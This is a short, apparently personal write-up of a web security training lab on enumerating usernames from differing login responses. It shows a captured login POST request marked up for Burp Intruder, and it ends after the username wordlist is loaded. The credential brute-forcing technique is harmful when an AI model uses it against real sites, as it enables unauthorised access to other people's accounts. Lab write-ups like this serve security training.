### Lab: Username enumeration via different responses
---
#### Objective: Enumerate a valid username, brute-force the user's password, then access their account page.
**Technologies Used**
Burpsuite Community Edition - Burp Intruder
**Solving Steps**   
[Enumeration]
Using Burpsuite, I first intercepted a login POST request in order to obtain the request body. Then I pasted the request body into the Burp Intruder with the login URL. Setting the special symbol around the username parameter.
```
POST /login HTTP/2
Host: 0a0a00d704e321688125895d004d00b5.web-security-academy.net
Cookie: session=FIskibe8vHXeybUfhRuCTQMxuCTHRQIH
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:158.0) Gecko/20100101 Firefox/158.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0a0a00d704e321688125895d004d00b5.web-security-academy.net
Referer: https://0a0a00d704e321688125895d004d00b5.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=$hello$&password=1234

$ represents the special symbol
```
I then pasted the candidate username list into the Burp Intruder payload configuration tab